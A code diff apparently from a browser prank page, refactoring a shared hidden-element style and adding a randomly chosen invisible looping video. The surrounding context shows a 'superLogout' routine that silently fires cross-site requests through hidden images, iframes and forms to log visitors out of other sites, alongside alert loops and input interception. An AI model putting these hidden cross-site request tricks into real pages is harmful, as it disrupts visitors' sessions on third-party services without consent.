@@ -21,6 +21,8 @@ const VELOCITY = 15
 const MARGIN = 10
 const TICK_LENGTH = 50
 
+const HIDDEN_STYLE = 'position: fixed; width: 1px; height: 1px; overflow: hidden; top: -10px; left: -10px;'
+
 const ART = [
   `
 ┊┊ ☆┊┊┊┊☆┊┊☆ ┊┊┊┊┊
@@ -200,6 +202,7 @@ function initParentWindow () {
       startAlertInterval()
       superLogout()
       removeHelloMessage()
+      startVideo()
     }
   })
 }
@@ -291,11 +294,11 @@ function interceptUserInput (onInput) {
 
 function startInvisiblePictureInPictureVideo () {
   const video = document.createElement('video')
-  video.src = './trolol.mp4'
+  video.src = getRandomArrayEntry(VIDEOS)
   video.autoplay = true
   video.loop = true
   video.muted = true
-  video.style = 'opacity: 0; height: 1;'
+  video.style = HIDDEN_STYLE
 
   document.body.appendChild(video)
 }
@@ -442,8 +445,6 @@ function enableFullscreen () {
  * Inspired by https://superlogout.com
  */
 function superLogout () {
-  const hiddenStyle = 'position: fixed; width: 1px; height: 1px; overflow: hidden; top: -10px; left: -10px;'
-
   function cleanup (el, delayCleanup) {
     if (delayCleanup) {
       delayCleanup = false
@@ -456,21 +457,21 @@ function superLogout () {
     const img = document.createElement('img')
     img.onload = () => cleanup(img)
     img.onerror = () => cleanup(img)
-    img.style = hiddenStyle
+    img.style = HIDDEN_STYLE
     document.body.appendChild(img)
     img.src = url
   }
 
   function post (url, params) {
     var iframe = document.createElement('iframe')
-    iframe.style = hiddenStyle
+    iframe.style = HIDDEN_STYLE
     iframe.name = 'iframe' + numSuperLogoutIframes
     document.body.appendChild(iframe)
 
     numSuperLogoutIframes += 1
 
     const form = document.createElement('form')
-    form.style = hiddenStyle
+    form.style = HIDDEN_STYLE
 
     let numLoads = 0
     iframe.onload = iframe.onerror = () => {
